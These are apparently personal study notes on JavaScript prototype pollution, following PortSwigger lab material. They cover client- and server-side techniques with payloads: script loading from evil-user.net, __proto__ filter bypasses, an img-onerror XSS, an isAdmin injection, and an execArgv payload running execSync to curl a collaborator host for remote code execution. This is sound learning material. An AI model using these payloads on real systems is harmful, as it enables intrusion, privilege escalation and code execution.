## prototype pollution
```
https://portswigger.net/web-security/prototype-pollution
client side ,server side pollution
Every object in JavaScript is linked to another object of some kind, known as its prototype
By default, JavaScript automatically assigns new objects one of its built-in prototypes
let myObject = {};
Object.getPrototypeOf(myObject);    // Object.prototype

let myString = "";
Object.getPrototypeOf(myString);    // String.prototype
->Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key
->The built-in prototypes provide useful properties and methods for working with basic data types. For example, the String.prototype object has
a toLowerCase() method. As a result, all strings automatically have a ready-to-use method for converting them to lowercase
->when we reference property x of object a ,js engine tries to access x directly on x,if not found then the prototype and so on
->prototype chain at last leads to null
--->Every object has a special property that you can use to access its prototype. Although this doesn't have a formally standardized name
, __proto__ is the de facto standard used by most browsers
->this property serves as both a getter and setter for the object's prototype.
String.prototype.removeWhitespace = function(){
    // remove leading and trailing whitespace
}
```
## pollution
```
source:A prototype pollution source is any user-controllable input that enables you to add arbitrary properties to prototype objects.
url,json based input webmessages
sink
gadget
->Robust websites may also explicitly set the prototype of the object to null, which ensures that it doesn't inherit any properties at all

```
## example of attack
```
let transport_url = config.transport_url || defaults.transport_url;
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
now ''https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net''
```
## finding gadgets
```
console.trace() is useful for debuggeing purposes
nice to read https://portswigger.net/web-security/prototype-pollution/client-side
```
## pollution via constructor
```
->Unless its prototype is set to null, every JavaScript object has a constructor property, which contains a reference to the
constructor function that was used to create it.
let myObjectLiteral = {};
let myObject = new Object();
myObject.constructor
->functions are also just objects under the hood. Each constructor function has a prototype property, which points to the prototype
 that will be assigned to any objects that are created by this constructor.
hence
myObject.constructor.prototype is same as myObject.__proto__
bypasses
'''
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
'''
```
## client side pollution via browser api fetch
### a usual fetch funciton 
```

fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error)

```
### typical attack
```
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```
## pollution
### setting property
```
Object.defineProperty(Object.prototype, 'YOUR-PROPERTY', {
    get() {
        console.trace();
        return 'polluted';
    }
})
```
### mitigation
```
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
}
```
## server side prototype pollution
### example of object getting the inherited properties
```
const myArray = ['a','b'];
Object.prototype.foo = 'bar';

for(const arrayKey in myArray){
    console.log(arrayKey);
}

// Output: 0, 1, foo
another example of sending properties along with json
"__proto__": {
    "isAdmin":true
}
```
### ways of chekcing serverside pollution
```
 Status code override(400-599

JSON spaces override
Charset override
```
### status code override
```
generic http error response(sometimes response status is set to 200 and error status is set inside the respone
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
...

Node's http-errors module contains the following function for generating this kind of error response:

function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status > 400 || status >= 600))) {
        status = 500
    }
    //...
```
#### exploit by status code
```
"__proto__": {
    "status":555
}
```
### JSON spaces override
```
The Express framework provides a json spaces option, which enables you to configure the number of spaces used to indent any JSON data in the response. developers mostly leve this to default
->>was fixed in Express 4.17.4

"__proto__": {
    "json spaces":10
}

"constructor": {
    "prototype": {
        "json spaces":10
    }
}

```
### charset override
```
utf -7::"role":"+AGYAbwBv-"
 "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
```
## webhook site
```
Webhook.site lets you easily inspect, test and create advanced scripts and workflows for any incoming HTTP request or e-mail. 

Any requests or emails sent to these addresses will be logged here instantly — you don't even have to refresh!
```
## child process -rce
```
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
read:::https://portswigger.net/web-security/prototype-pollution/server-side/lab-remote-code-execution-via-server-side-prototype-pollution
```
